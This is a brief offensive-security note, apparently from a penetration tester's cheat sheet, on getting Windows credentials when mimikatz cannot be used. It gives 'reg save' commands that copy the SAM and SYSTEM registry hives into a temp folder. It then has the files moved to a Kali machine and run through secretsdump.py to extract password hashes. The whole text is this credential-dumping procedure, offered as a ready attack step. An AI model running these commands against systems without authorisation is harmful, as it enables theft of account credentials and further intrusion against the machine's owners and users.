> If we cant dump credentials using mimikatz we can save the SAM and SYSTEM files and then use those to extract information:

```
reg save HKLM\SYSTEM C:\Windows\Temp\system
reg save HKLM\SAM C:\Windows\Temp\sam
```

> Transfer to kali then run:

```
secretsdump.py -system /home/kali/SYSTEM -sam /home/kali/SAM LOCAL 
```

